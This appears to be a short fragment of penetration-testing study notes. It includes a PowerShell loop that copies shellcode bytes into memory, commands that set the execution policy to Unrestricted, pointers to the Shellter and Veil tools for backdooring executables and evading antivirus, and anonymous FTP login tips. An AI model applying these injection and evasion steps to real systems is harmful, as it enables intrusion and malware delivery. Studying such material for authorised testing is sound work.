for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};
```
powershell unrestricted execution

```
Get-ExecutionPolicy -Scope CurrentUser
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
Get-ExecutionPolicy -Scope CurrentUser
```

use shellter for modifying exes
```
shellter
```

for anonymous ftp, username is 'anonymous'

```
User:  anonymous
Password:  anonymous@domain.com
```

for active ftp session do:
```
ftp -A $ip
```

binary -> allows transfer of binary files

Use Veil as an alternative to shellter for creating .bat files

```
/usr/share/veil/Veil.py
```
